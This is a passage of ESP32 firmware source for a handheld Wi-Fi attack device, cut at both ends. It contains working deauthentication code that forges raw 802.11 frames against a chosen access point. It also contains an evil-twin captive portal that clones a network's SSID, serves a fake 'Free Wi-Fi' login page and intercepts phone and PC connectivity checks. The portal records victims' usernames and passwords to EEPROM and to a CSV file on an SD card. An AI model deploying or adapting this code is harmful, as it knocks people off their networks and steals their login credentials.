           r.bssid[0], r.bssid[1], r.bssid[2], r.bssid[3], r.bssid[4], r.bssid[5]);

  // NOTE: In this file TFT_WHITE is remapped to FEATURE_TEXT (orange).
  // Use real WHITE for normal detail text.
  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setTextSize(1);

  tft.setCursor(10, y);
  tft.print("SSID: "); tft.print(isHidden ? "(Hidden)" : r.ssid);
  y += 20;

  tft.setCursor(10, y);
  tft.print("BSSID: "); tft.print(bssidStr);
  y += 20;

  tft.setCursor(10, y);
  tft.print("RSSI: "); tft.print(rssi); tft.print(" dBm");
  y += 20;

  tft.setCursor(10, y);
  tft.print("Signal: "); tft.print(signalQuality); tft.print("%");
  y += 20;

  tft.setCursor(10, y);
  tft.print("Channel: "); tft.print(channel);
  y += 20;

  tft.setCursor(10, y);
  tft.print("Encryption: "); tft.print(encryptionType);
  y += 20;

  tft.setCursor(10, y);
  tft.print("Est. Distance: "); tft.print(estimatedDistance, 1); tft.print("m");

  drawTabBar("Rescan", false, "", true, "Back", false);
}

void handleButton() {
  unsigned long currentMillis = millis();
  if (currentMillis - lastButtonPress < debounceTime) return;

  bool updated = false;
  int oldPage = current_page;

  if (!pcf.digitalRead(BTN_UP)) {
    if (!isDetailView && currentIndex > 0) {
      currentIndex--;
      delay(200);
      current_page = currentIndex / max(1, NETWORKS_PER_PAGE);
      updated = true;
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_DOWN)) {
    if (!isDetailView && currentIndex < scanRecCount - 1) {
      currentIndex++;
      delay(200);
      current_page = currentIndex / max(1, NETWORKS_PER_PAGE);
      updated = true;
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_RIGHT)) {
    delay(200);
    if (!isScanning) {
      isDetailView = !isDetailView;
      updated = true;
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_LEFT)) {
    delay(200);
    if (isDetailView) {
      isDetailView = false;
    } else if (!isScanning) {
      startWiFiScan();
    }
    updated = true;
    lastButtonPress = currentMillis;
  }

  if (updated) {
    if (isDetailView) displayWiFiDetails();
    else displayWiFiList(current_page != oldPage);
  }
}

void runUI() {

    static int iconY = STATUS_BAR_Y_OFFSET;

    if (!uiDrawn) {
        tft.drawLine(0, 19, 240, 19, TFT_WHITE);
        tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

        for (int i = 0; i < ICON_NUM; i++) {
            if (icons[i] != NULL) {
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            }
        }
        tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
        uiDrawn = true;
    }

    static unsigned long lastAnimationTime = 0;
    static int animationState = 0;
    static int activeIcon = -1;

    if (animationState > 0 && millis() - lastAnimationTime >= 150) {
        if (animationState == 1) {
            tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            animationState = 2;

            switch (activeIcon) {
                case 0:
                    if (!isScanning) {
                        startWiFiScan();
                    }
                    break;
            }
        } else if (animationState == 2) {
            animationState = 0;
            activeIcon = -1;
        }
        lastAnimationTime = millis();
    }

    static unsigned long lastTouchCheck = 0;
    const unsigned long touchCheckInterval = 120;
    static uint32_t lastTouchActionMs = 0;

    if (millis() - lastTouchCheck >= touchCheckInterval) {
        int x, y;
        if (feature_active && readTouchXY(x, y)) {
            const uint32_t nowMs = millis();
            if (nowMs - lastTouchActionMs < 250) {
                lastTouchCheck = millis();
                return;
            }
            if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                for (int i = 0; i < ICON_NUM; i++) {
                    if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
                        if (icons[i] != NULL && animationState == 0) {

                            if (i == 1) {
                                feature_exit_requested = true;
                                lastTouchActionMs = nowMs;
                            } else {

                                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                                animationState = 1;
                                activeIcon = i;
                                lastAnimationTime = millis();
                                lastTouchActionMs = nowMs;
                            }
                        }
                        break;
                    }
                }
            } else if (!isScanning) {
                const int networkCount = WiFi.scanComplete();

                // Deauther-like bottom bar has a large touch hitbox.
                if (y >= 290 && y <= 320) {
                    const bool prevDisabled = (current_page == 0);
                    const bool nextDisabled = ((current_page + 1) * NETWORKS_PER_PAGE >= networkCount);

                    if (x >= 0 && x <= 57) {
                        drawButton(0, 304, 57, 16, "Rescan", true, false);
                        delay(50);
                        startWiFiScan();
                        lastTouchActionMs = nowMs;
                    } else if (x >= 117 && x <= 179 && !isDetailView && !prevDisabled) {
                        drawButton(117, 304, 57, 16, "Prev", true, false);
                        current_page--;
                        if (current_page < 0) current_page = 0;
                        delay(50);
                        displayWiFiList(true);
                        lastTouchActionMs = nowMs;
                    } else if (x >= 177 && x <= 240) {
                        if (isDetailView) {
                            drawButton(177, 304, 57, 16, "Back", true, false);
                            isDetailView = false;
                            delay(50);
                            displayWiFiList(true);
                            lastTouchActionMs = nowMs;
                        } else if (!nextDisabled) {
                            drawButton(177, 304, 57, 16, "Next", true, false);
                            current_page++;
                            delay(50);
                            displayWiFiList(true);
                            lastTouchActionMs = nowMs;
                        }
                    }
                } else if (!isDetailView) {
                    const int listMaxY = LIST_FIRST_ROW_Y + (NETWORKS_PER_PAGE * LIST_ROW_H);
                    if (networkCount > 0 && y >= LIST_FIRST_ROW_Y && y < listMaxY) {
                        const int row = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
                        const int idx = (current_page * NETWORKS_PER_PAGE) + row;
                        if (idx >= 0 && idx < networkCount) {
                            currentIndex = idx;
                            isDetailView = true;
                            displayWiFiDetails();
                            lastTouchActionMs = nowMs;
                        }
                    }
                }
            }
        }
        lastTouchCheck = millis();
    }
}

void wifiscanSetup() {

  tft.fillScreen(TFT_BLACK);

  uiDrawn = false;

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);

  setupTouchscreen();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  // Defensive: don't trust the bg scan's cached results. There's a TOCTOU
  // race between the bg task's `!feature_active` check and its scanDelete()
  // call that can free the records while we render. Drop any pending state
  // and force a clean foreground scan instead. The 50 ms delay gives the bg
  // task time to observe feature_active=true and back off before we touch
  // WiFi state.
  vTaskDelay(50 / portTICK_PERIOD_MS);
  WiFi.scanDelete();
  bgHasResults = false;
  startWiFiScan();

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  runUI();
}

// ── Attack popup menu (short-tap SELECT on a network) ───────────────────────
static const char* ATTACK_OPTIONS[] = {
  "Deauth 5s",
  "Pin to Pwn whitelist",
  "Cancel"
};
static constexpr int ATTACK_OPTIONS_N = 3;
static bool attackMenuOpen = false;
static int  attackMenuSel  = 0;

static void drawAttackMenu(const ScanRec& r) {
  const int X = 16, Y = 60, W = 208, H = 160;
  tft.fillRect(X, Y, W, H, TFT_BLACK);
  tft.drawRect(X,     Y,     W,     H,     0xE0E6);
  tft.drawRect(X + 1, Y + 1, W - 2, H - 2, 0xE0E6);
  tft.setTextFont(2);
  tft.setTextSize(1);
  tft.setTextColor(0xE0E6, TFT_BLACK);
  tft.setCursor(X + 8, Y + 6);
  tft.print("[ ATTACK ]");
  tft.setCursor(X + 8, Y + 24);
  tft.setTextColor(WHITE, TFT_BLACK);
  char ssid[18];
  strncpy(ssid, r.ssid[0] ? r.ssid : "(hidden)", 17); ssid[17] = 0;
  tft.print(ssid);

  for (int i = 0; i < ATTACK_OPTIONS_N; i++) {
    int ry = Y + 50 + i * 22;
    if (i == attackMenuSel) tft.fillRect(X + 4, ry - 2, W - 8, 20, 0x6020);
    tft.setTextColor(i == attackMenuSel ? WHITE : 0xE0E6,
                     i == attackMenuSel ? 0x6020 : TFT_BLACK);
    tft.setCursor(X + 10, ry);
    tft.print(ATTACK_OPTIONS[i]);
  }

  tft.setTextColor(0x6020, TFT_BLACK);
  tft.setCursor(X + 6, Y + H - 16);
  tft.print("tap SEL=run  hold=back");
}

static void attackDeauth(const ScanRec& r) {
  tft.fillRect(16, 60, 208, 160, TFT_BLACK);
  tft.setTextFont(2);
  tft.setTextColor(0xE0E6, TFT_BLACK);
  tft.setCursor(24, 80);
  tft.print("Deauthing...");
  tft.setCursor(24, 110);
  char buf[40];
  snprintf(buf, sizeof(buf), "ch%u  %s",
           (unsigned)r.channel, r.ssid[0] ? r.ssid : "(hidden)");
  tft.print(buf);

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(r.channel, WIFI_SECOND_CHAN_NONE);

  uint8_t f[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0,
    0x00, 0x00, 0x07, 0x00
  };
  memcpy(&f[10], r.bssid, 6);
  memcpy(&f[16], r.bssid, 6);

  uint32_t t0 = millis();
  uint32_t sent = 0;
  while ((millis() - t0) < 5000) {
    Deauther::wsl_bypasser_send_raw_frame(f, sizeof(f));
    sent++;
    delayMicroseconds(1500);
  }

  tft.setCursor(24, 140);
  tft.setTextColor(0x07C0, TFT_BLACK);
  snprintf(buf, sizeof(buf), "Sent %lu frames", (unsigned long)sent);
  tft.print(buf);
  delay(1200);
}

static void attackPinWhitelist(const ScanRec& r) {
  tft.fillRect(16, 60, 208, 160, TFT_BLACK);
  tft.setTextFont(2);
  tft.setTextColor(0xE0E6, TFT_BLACK);
  tft.setCursor(24, 80);
  tft.print("Pinning...");

  bool ok = false;
  if (!SD.exists("/pwn")) SD.mkdir("/pwn");
  File f = SD.open("/pwn/whitelist.txt", FILE_APPEND);
  if (f) {
    if (r.ssid[0]) f.printf("# %s\n", r.ssid);
    f.printf("%02X:%02X:%02X:%02X:%02X:%02X\n",
             r.bssid[0], r.bssid[1], r.bssid[2], r.bssid[3], r.bssid[4], r.bssid[5]);
    f.close();
    ok = true;
  }

  tft.setCursor(24, 110);
  tft.setTextColor(ok ? 0x07C0 : 0xE0E6, TFT_BLACK);
  tft.print(ok ? "Pinned to /pwn/whitelist.txt" : "SD write failed");
  delay(1500);
}

void wifiscanLoop() {

  // Attack popup takes input precedence over the normal list.
  if (attackMenuOpen) {
    if (isButtonPressed(BTN_SELECT)) {
      // Long-hold SELECT closes the popup without firing.
      attackMenuOpen = false;
      while (isButtonPressed(BTN_SELECT)) delay(20);
      (void)isSelectShortTapped();
      displayWiFiList(true);
      return;
    }
    static bool upPrev = false, downPrev = false, leftPrev = false;
    bool up = !pcf.digitalRead(BTN_UP);
    bool dn = !pcf.digitalRead(BTN_DOWN);
    bool lf = !pcf.digitalRead(BTN_LEFT);
    if (up && !upPrev) {
      attackMenuSel = (attackMenuSel + ATTACK_OPTIONS_N - 1) % ATTACK_OPTIONS_N;
      drawAttackMenu(scanRecs[currentIndex]);
    }
    if (dn && !downPrev) {
      attackMenuSel = (attackMenuSel + 1) % ATTACK_OPTIONS_N;
      drawAttackMenu(scanRecs[currentIndex]);
    }
    if (lf && !leftPrev) {
      attackMenuOpen = false;
      displayWiFiList(true);
    }
    upPrev = up; downPrev = dn; leftPrev = lf;

    if (isSelectShortTapped()) {
      const ScanRec& r = scanRecs[currentIndex];
      if      (attackMenuSel == 0) attackDeauth(r);
      else if (attackMenuSel == 1) attackPinWhitelist(r);
      // option 2 = Cancel
      attackMenuOpen = false;
      displayWiFiList(true);
    }
    delay(15);
    return;
  }

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  // Short SELECT tap on a network row opens the attack menu.
  if (!isScanning && scanRecCount > 0 && currentIndex >= 0
      && currentIndex < scanRecCount && isSelectShortTapped()) {
    attackMenuOpen = true;
    attackMenuSel  = 0;
    drawAttackMenu(scanRecs[currentIndex]);
    return;
  }

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  static bool lastDetailView = false;
  static bool lastScanning = true;

  handleButton();
  runUI();
  updateStatusBar();

  if (isScanning) {
    if (!lastScanning) {
      displayScanning();
      lastScanning = true;
    }
  } else if (!isDetailView) {
    if (lastDetailView || lastScanning) {
      displayWiFiList(true);
    }
    lastDetailView = false;
    lastScanning = false;
  } else {
    if (!lastDetailView) {
      displayWiFiDetails();
    }
    lastDetailView = true;
    }
  }
}

namespace CaptivePortal {

const char* default_ssid = "DARK-DIV_AP";
char custom_ssid[32] = "DARK-DIV_AP";
const char* password = NULL;

static uint8_t ap_channel = 1;

static bool cp_deauth_active = false;
static wifi_ap_record_t cp_target_ap;
static uint8_t cp_target_channel;
static uint32_t cp_deauth_packet_count = 0;
static uint32_t cp_deauth_success_count = 0;
static unsigned long cp_last_deauth_time = 0;

static uint8_t cp_deauth_frame_default[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x00, 0x00,
    0x01, 0x00
};
static uint8_t cp_deauth_frame[sizeof(cp_deauth_frame_default)];
DNSServer dnsServer;
const byte DNS_PORT = 53;
WebServer server(80);

bool attackActive = false;

static void stopAttack();
static void startAttack();
void drawMainMenu();

#define EEPROM_SIZE 1440
#define SSID_ADDR 0
#define CRED_ADDR 32
#define COUNT_ADDR 1248
#define MAX_CREDS 20
#define CRED_SIZE 64

String terminalBuffer[MAX_LINES];
uint16_t colorBuffer[MAX_LINES];
int lineIndex = 0;

struct Credential {
  char username[16];
  char password[16];
  char ssid[32];
};

enum Screen { MAIN_MENU, KEYBOARD, CRED_LIST };
Screen currentScreen = MAIN_MENU;
int credPage = 0;

bool keyboardActive = false;
String inputSSID = "";
const int keyWidth = 22;
const int keyHeight = 18;
const int keySpacing = 2;
const char* keyboardLayout[] = {
  "1234567890",
  "qwertyuiop",
  "asdfghjkl ",
  "zxcvbnm_<-"
};
bool cursorState = false;
unsigned long lastCursorToggle = 0;

const char* seriesSSIDs[] = {"DARK-DIV_AP", "FreeWiFi", "Loading..."};
const int numSeriesSSIDs = 3;
int seriesSSIDIndex = 0;

String loginPage = R"(
<!DOCTYPE html>
<html>
<head>
  <title>Wi-Fi Login</title>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <meta http-equiv='Cache-Control' content='no-cache, no-store, must-revalidate'>
  <meta http-equiv='Pragma' content='no-cache'>
  <meta http-equiv='Expires' content='0'>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; }
    h1 { color: #333; }
    .container { max-width: 400px; margin: auto; padding: 20px; background: white; border-radius: 10px; }
    input { padding: 10px; margin: 10px 0; width: 100%; box-sizing: border-box; border: 1px solid #ccc; border-radius: 5px; }
    button { padding: 10px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
    button:hover { background-color: #0056b3; }
  </style>
</head>
<body>
  <div class='container'>
    <h1>Free Wi-Fi</h1>
    <p>Log in to connect.</p>
    <form action='/login' method='POST'>
      <input type='text' name='username' placeholder='Username' required><br>
      <input type='password' name='password' placeholder='Password' required><br>
      <button type='submit'>Log In</button>
    </form>
  </div>
</body>
</html>
)";

void scrollTerminal() {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    terminalBuffer[i] = terminalBuffer[i + 1];
    colorBuffer[i] = colorBuffer[i + 1];
  }
}

void displayPrint(String text, uint16_t color, bool extraSpace = false) {
  if (lineIndex >= MAX_LINES - 1) {
    scrollTerminal();
    lineIndex = MAX_LINES - 1;
  }

  terminalBuffer[lineIndex] = text;
  colorBuffer[lineIndex] = color;
  lineIndex++;

  if (extraSpace && lineIndex < MAX_LINES) {
    terminalBuffer[lineIndex] = "";
    colorBuffer[lineIndex] = TFT_WHITE;
    lineIndex++;
  }

  for (int i = 0; i < lineIndex; i++) {
    int yPos = i * LINE_HEIGHT + 45;
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
    tft.setTextColor(colorBuffer[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(terminalBuffer[i]);
  }
}

void saveCredential(String username, String password, String ssid) {
  Credential cred;
  strncpy(cred.username, username.c_str(), 15);
  cred.username[15] = '\0';
  strncpy(cred.password, password.c_str(), 15);
  cred.password[15] = '\0';
  strncpy(cred.ssid, ssid.c_str(), 31);
  cred.ssid[31] = '\0';

  int count = EEPROM.read(COUNT_ADDR);
  Serial.printf("Before saving, credential count: %d\n", count);
  if (count < MAX_CREDS) {
    int addr = CRED_ADDR + (count * CRED_SIZE);
    EEPROM.put(addr, cred);
    count++;
    EEPROM.write(COUNT_ADDR, count);
    EEPROM.commit();
    Serial.println("Credential saved at address " + String(addr));
    Serial.println("Username: " + String(cred.username));
    Serial.println("Password: " + String(cred.password));
    Serial.println("SSID: " + String(cred.ssid));
    Serial.printf("After saving, credential count: %d\n", count);
  } else {
    Serial.println("Credential storage full");
  }
}

static bool cp_sd_mounted = false;

static bool cpMountSD() {

  if (cp_sd_mounted) {
    if (SD.exists("/")) return true;
    cp_sd_mounted = false;
  }

  bool ok = false;
  #ifdef SD_CS
  ok = SD.begin(SD_CS);
  #endif
  #ifdef SD_CS_PIN
  if (!ok) {
    #ifdef CC1101_CS
    if (SD_CS_PIN != CC1101_CS) ok = SD.begin(SD_CS_PIN);
    #else
    ok = SD.begin(SD_CS_PIN);
    #endif
  }
  #endif
  cp_sd_mounted = ok;
  return ok;
}

static bool cpEnsureDir(const char* dirPath) {
  if (!cpMountSD()) return false;
  if (!SD.exists(dirPath)) {
    if (SD.mkdir(dirPath)) return true;

    if (dirPath && dirPath[0] == '/') return SD.mkdir(dirPath + 1);
    return false;
  }
  return true;
}

static String cpCsvEscape(const String& s) {
  bool needsQuotes = false;
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == ',' || c == '"' || c == '\n' || c == '\r') { needsQuotes = true; break; }
  }
  if (!needsQuotes) return s;

  String out = "\"";
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '"') out += "\"\"";
    else out += c;
  }
  out += "\"";
  return out;
}

static bool cpAppendLineToFile(const char* path, const String& line) {
  if (!cpMountSD()) return false;

  File f = SD.open(path, "a");
  if (!f) {
    cp_sd_mounted = false;
    if (!cpMountSD()) return false;
    f = SD.open(path, "a");
    if (!f) return false;
  }

  bool ok = (f.print(line) > 0);
  f.flush();
  f.close();
  return ok;
}

static bool cpAppendCaptureToSD(const String& remoteIp, const String& username, const String& passwordStr, const String& ssid) {
  const char* dir = "/captive_portal";
  const char* path = "/captive_portal/captured.csv";
  if (!cpEnsureDir(dir)) return false;

  bool exists = SD.exists(path);
  if (!exists) {
    if (!cpAppendLineToFile(path, "millis,remote_ip,ssid,username,password\r\n")) return false;
  }

  String row;
  row.reserve(32 + remoteIp.length() + ssid.length() + username.length() + passwordStr.length());
  row += String(millis());
  row += ",";
  row += cpCsvEscape(remoteIp);
  row += ",";
  row += cpCsvEscape(ssid);
  row += ",";
  row += cpCsvEscape(username);
  row += ",";
  row += cpCsvEscape(passwordStr);
  row += "\r\n";
  return cpAppendLineToFile(path, row);
}

static bool cpDumpAllCredentialsToSD(int* outCount) {
  if (outCount) *outCount = 0;
  const char* dir  = "/captive_portal";
  const char* path = "/captive_portal/eeprom_dump.csv";
  if (!cpEnsureDir(dir)) return false;

  int count = EEPROM.read(COUNT_ADDR);
  if (count < 0) count = 0;
  if (count > MAX_CREDS) count = MAX_CREDS;

  File f = SD.open(path, "w");
  if (!f) {
    cp_sd_mounted = false;
    if (!cpMountSD()) return false;
    f = SD.open(path, "w");
    if (!f) return false;
  }

  f.print("index,ssid,username,password\r\n");
  for (int i = 0; i < count; i++) {
    Credential cred;
    EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);
    String line;
    line.reserve(16 + strlen(cred.ssid) + strlen(cred.username) + strlen(cred.password));
    line += String(i);
    line += ",";
    line += cpCsvEscape(String(cred.ssid));
    line += ",";
    line += cpCsvEscape(String(cred.username));
    line += ",";
    line += cpCsvEscape(String(cred.password));
    line += "\r\n";
    f.print(line);
  }
  f.flush();
  f.close();
  if (outCount) *outCount = count;
  return true;
}

static void cpCredListStatus(const String& msg, uint16_t color) {
  const int y = 272;
  tft.fillRect(0, y, 240, 16, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(2, y + 4);
  tft.print(msg);
}

static void cpStartDeauth(const String& ssid, const uint8_t* bssid, uint8_t channel) {
  if (cp_deauth_active) return;

  memset(&cp_target_ap, 0, sizeof(cp_target_ap));
  strcpy((char*)cp_target_ap.ssid, ssid.c_str());
  memcpy(cp_target_ap.bssid, bssid, 6);
  cp_target_ap.primary = channel;
  cp_target_channel = channel;

  cp_deauth_active = true;
  cp_deauth_packet_count = 0;
  cp_deauth_success_count = 0;
  cp_last_deauth_time = 0;

  Serial.printf("[CP Deauth] Starting deauth against cloned AP: %s CH=%u\n", ssid.c_str(), channel);
}

static void cpStopDeauth() {
  if (!cp_deauth_active) return;

  cp_deauth_active = false;
  Serial.printf("[CP Deauth] Stopped deauth (packets: %u, success: %u)\n",
                (unsigned)cp_deauth_packet_count, (unsigned)cp_deauth_success_count);
}

static void cpSendDeauthFrame() {
  if (!cp_deauth_active) return;

  esp_wifi_set_channel(cp_target_channel, WIFI_SECOND_CHAN_NONE);

  memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
  memcpy(&cp_deauth_frame[10], cp_target_ap.bssid, 6);
  memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);
  cp_deauth_frame[26] = 7;
  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);

  memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
  memcpy(&cp_deauth_frame[10], cp_target_ap.bssid, 6);
  memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);

  memset(&cp_deauth_frame[4], 0xFF, 6);
  cp_deauth_frame[26] = 7;
  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);

  cp_deauth_packet_count += 2;
}

static void handleGenerate204() {
  Serial.println("Android /generate_204 requested");
  displayPrint("Android /generate_204 requested", GREEN, false);
  server.sendHeader("Location", "/login.html", true);
  server.send(302, "text/plain", "");
}

static void handleHotspotDetect() {
  Serial.println("iOS /hotspot-detect.html requested");
  displayPrint("iOS /hotspot-detect.html requested", GREEN, false);
  server.send(200, "text/html", loginPage);
}

static void handleCaptiveApple() {
  Serial.println("iOS /captive.apple.com requested");
  displayPrint("iOS /captive.apple.com requested", GREEN, false);
  server.send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
}

static void handleNCSITxt() {
  Serial.println("Windows /ncsi.txt requested");
  displayPrint("Windows /ncsi.txt requested", GREEN, false);
  server.send(200, "text/plain", "Microsoft NCSI");
}

static void handleConnectTestTxt() {
  Serial.println("Windows /connecttest.txt requested");
  displayPrint("Windows /connecttest.txt requested", GREEN, false);
  server.send(200, "text/plain", "Microsoft Connect Test");
}

static void handleLoginPage() {
  Serial.println("Login page (/login.html) requested");
  displayPrint("Login page (/login.html) requested", GREEN, false);
  server.send(200, "text/html", loginPage);
}

static void handleRoot() {
  Serial.println("Root (/) requested");
  displayPrint("Root (/) requested", GREEN, false);
  server.send(200, "text/html", loginPage);
}

static void handleLoginPost() {
  String username = server.arg("username");
  String password = server.arg("password");
  String remoteIp = server.client().remoteIP().toString();
  Serial.println("Captured Credentials:");
  Serial.println("Username: " + username);
  Serial.println("Password: " + password);
  Serial.println("SSID: " + String(custom_ssid));
  saveCredential(username, password, custom_ssid);
  if (cpAppendCaptureToSD(remoteIp, username, password, String(custom_ssid))) {
    Serial.println("[SD] Captive capture appended to /captive_portal/captured.csv");
  } else {
    Serial.println("[SD] Captive capture export failed (SD not mounted / write error)");
  }
  server.send(200, "text/html", "<h1>Login Successful!</h1><p>You are now connected.</p>");
}

static void handleNotFound() {
  Serial.println("Not found: " + server.uri());
  server.sendHeader("Location", "/login.html", true);
  server.send(302, "text/plain", "");
}

void setupWebServer() {
  server.on("/generate_204", HTTP_GET, static_cast<void (*)()>(handleGenerate204));
  server.on("/hotspot-detect.html", HTTP_GET, static_cast<void (*)()>(handleHotspotDetect));
  server.on("/captive.apple.com", HTTP_GET, static_cast<void (*)()>(handleCaptiveApple));
  server.on("/ncsi.txt", HTTP_GET, static_cast<void (*)()>(handleNCSITxt));
  server.on("/connecttest.txt", HTTP_GET, static_cast<void (*)()>(handleConnectTestTxt));
  server.on("/login.html", HTTP_GET, static_cast<void (*)()>(handleLoginPage));
  server.on("/", HTTP_GET, static_cast<void (*)()>(handleRoot));
  server.on("/login", HTTP_POST, static_cast<void (*)()>(handleLoginPost));
  server.onNotFound(static_cast<void (*)()>(handleNotFound));
}

void loadSSID() {
  String savedSSID = "";
  for (int i = 0; i < 32; i++) {
    char c = EEPROM.read(SSID_ADDR + i);
    if (c == 0) break;
    savedSSID += c;
  }
  if (savedSSID.length() > 0) {
    savedSSID.toCharArray(custom_ssid, 32);
  } else {
    strcpy(custom_ssid, default_ssid);
  }
}

void saveSSID(String ssid) {
  for (int i = 0; i < 32; i++) {
    if (i < ssid.length()) {
      EEPROM.write(SSID_ADDR + i, ssid[i]);
    } else {
      EEPROM.write(SSID_ADDR + i, 0);
    }
  }
  EEPROM.commit();
  ssid.toCharArray(custom_ssid, 32);
  if (attackActive) {
    WiFi.softAPdisconnect(true);
    WiFi.softAP(custom_ssid, password, ap_channel);
    Serial.println("New SSID set: " + String(custom_ssid));
  }
}

void deleteCredential(int index) {
  int count = EEPROM.read(COUNT_ADDR);
  if (index < 0 || index >= count) {
    Serial.println("Invalid credential index: " + String(index));
    return;
  }

  for (int i = index; i < count - 1; i++) {
    Credential cred;
    EEPROM.get(CRED_ADDR + ((i + 1) * CRED_SIZE), cred);
    EEPROM.put(CRED_ADDR + (i * CRED_SIZE), cred);
  }

  count--;
  EEPROM.write(COUNT_ADDR, count);
  EEPROM.commit();
  Serial.println("Credential deleted at index " + String(index));
  Serial.printf("New credential count: %d\n", count);
}

void clearAllCredentials() {
  EEPROM.put(COUNT_ADDR, (uint32_t)0);

  int endAddr = CRED_ADDR + (MAX_CREDS * CRED_SIZE);
  if (endAddr > COUNT_ADDR) {
    Serial.println("Error: Credential clear would overwrite counter!");
    endAddr = COUNT_ADDR;
  }
  for (int i = CRED_ADDR; i < endAddr; i++) {
    EEPROM.write(i, 0);
  }
  EEPROM.commit();
  Serial.println("All credentials cleared from " + String(CRED_ADDR) + " to " + String(endAddr - 1));
}

static void cpDrawCloneFrame(const char* title) {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(GREEN, TFT_BLACK);
  tft.setCursor(8, 45);
  tft.println(title);
}

static void cpDrawCloneFooter(bool prevEnabled, bool nextEnabled) {

  FeatureUI::drawFooterBg();

  FeatureUI::Button btns[4];

  FeatureUI::layoutFooter4(
    btns,
    "Back", FeatureUI::ButtonStyle::Secondary,
    "Scan", FeatureUI::ButtonStyle::Secondary,
    "Prev", FeatureUI::ButtonStyle::Secondary,
    "Next", FeatureUI::ButtonStyle::Secondary,
    false, false, !prevEnabled, !nextEnabled
  );

  for (int i = 0; i < 4; ++i) {
    FeatureUI::drawButtonRect(btns[i].x, btns[i].y, btns[i].w, btns[i].h,
                              btns[i].label, btns[i].style,
                              false, btns[i].disabled,
                              1);
  }
}

static bool cpCloneScanAndSelect(String& outSsid, uint8_t& outChannel, uint8_t outBssid[6]) {
  const int MAX_RESULTS = 40;
  const int rowsPerPage = 12;

  while (true) {

    if (feature_active && isButtonPressed(BTN_SELECT)) return false;

    cpDrawCloneFrame("Scanning...");
    loading(90, ORANGE, 0, 0, 2, true);

    WiFi.scanDelete();
    int n = WiFi.scanNetworks(false, true);
    if (n <= 0) {
      cpDrawCloneFrame("No networks found");
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(8, 62);
      tft.println("Tap Scan, or Back.");
      cpDrawCloneFooter(false, false);

      int x, y;
      while (!readTouchXY(x, y)) delay(10);
      delay(200);
      const int footerY = tft.height() - FeatureUI::FOOTER_H;
      if (y >= footerY) {
        if (x < 60) return false;
        if (x < 120) continue;
      }
      continue;
    }

    int count = min(n, MAX_RESULTS);
    int idx[MAX_RESULTS];
    for (int i = 0; i < count; i++) idx[i] = i;

    for (int i = 0; i < count - 1; i++) {
      int best = i;
      for (int j = i + 1; j < count; j++) {
        if (WiFi.RSSI(idx[j]) > WiFi.RSSI(idx[best])) best = j;
      }
      if (best != i) {
        int tmp = idx[i];
        idx[i] = idx[best];
        idx[best] = tmp;
      }
    }

    int page = 0;
    while (true) {
      if (feature_active && isButtonPressed(BTN_SELECT)) return false;

      cpDrawCloneFrame("Clone Access Point");
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(8, 62);
      tft.println("Tap a network to clone SSID+CH");

      int totalPages = (count + rowsPerPage - 1) / rowsPerPage;
